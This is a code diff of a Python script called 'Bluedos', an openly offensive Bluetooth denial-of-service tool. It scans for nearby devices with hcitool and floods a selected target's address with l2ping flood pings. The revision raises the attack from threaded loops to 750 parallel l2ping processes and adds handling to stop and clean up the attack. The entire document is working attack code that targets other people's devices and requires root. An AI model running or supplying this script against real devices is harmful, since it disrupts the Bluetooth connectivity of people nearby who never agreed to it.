@@ -1,28 +1,32 @@
 # Bluedos by @ceigh
-from os import getuid
-from subprocess import check_output, Popen
+from os import getuid, kill
+from signal import SIGTERM
+from subprocess import check_output, Popen, DEVNULL
 
 
 def confirm(question):
     while 1:
-        reply = input(f"{question}: ").lower()[:1]
-        if reply in 'y':  # 'yosjtdд' (international), using {in} to consider the enter
-            return 1
-        elif reply == 'n':
-            return 0
+        try:
+            reply = input(f"{question}: ").lower()[:1]
+            if reply in 'y':  # 'yosjtdд' (international), using {in} to consider the enter
+                return 1
+            elif reply == 'n':
+                return 0
+        except (KeyboardInterrupt, EOFError):
+            bye()
 
 
 def bye():
     from time import sleep
     print("\nBye!")
     sleep(1)
-    print("\033c")
+    print('\033c')
+    exit(0)
 
 
 def get_devices():
-    print("\033c")
     if len(check_output(['hcitool', 'dev'])[9:]):
-        print("Scanning...\n")
+        print("\033cScanning...\n")
         hcitool_out = check_output(['hcitool', 'scan']).decode()[13:-1]
         devices = [i.split('\t')[1:] for i in hcitool_out.split('\n') if len(hcitool_out) != 0]
         return devices
@@ -31,17 +35,12 @@ def get_devices():
 
 
 def attack(target):
-    from threading import Thread
-
-    def popen():
-        for i in range(10):
-            Popen(['l2ping', '-f', '-s', '660', target[0]])
-
-    print(f"Attacking '{target[1]}'...\nTo stop type Ctrl+C")
+    print(f"\033c\nTrying on '{target[1]}', please wait...")
+    pids = [Popen(['l2ping', '-f', '-s', '660', target[0]], stdout=DEVNULL).pid for i in range(750)]
     try:
-        for j in range(10):
-            Thread(target=popen).start()
-    except KeyboardInterrupt:
+        input(f"\033c\nAttacking '{target[1]}', press enter to stop... ")
+    finally:
+        list(map(lambda pid: kill(pid, SIGTERM), pids))
         bye()
 
 
@@ -57,21 +56,23 @@ def main():
     elif dev_number == 1:
         attack(devices[0])
     else:
-        print("Several devices found:")
+        print("\033c\nSeveral devices found:\n")
         for index, device in enumerate(devices):
-            print(f"{index}) '{device[1]}' <{device[0]}>")
+            print(f"{index}) '{device[1]}'\t<{device[0]}>")
         while 1:
             try:
-                target_i = int(input(f"Select a device (0-{dev_number - 1}): "))
+                target_i = int(input(f"\nSelect a device (0-{dev_number - 1}): "))
+                if target_i in range(dev_number):
+                    break
             except ValueError:
                 continue
-            if target_i in range(dev_number):
-                break
+            except (KeyboardInterrupt, EOFError):
+                bye()
         attack(devices[target_i])
 
 
 if __name__ == '__main__':
-    if not getuid():
+    if not getuid():  # check for root launch
         main()
     else:
-        exit("Run it as sudo")
+        exit("Run it as root")
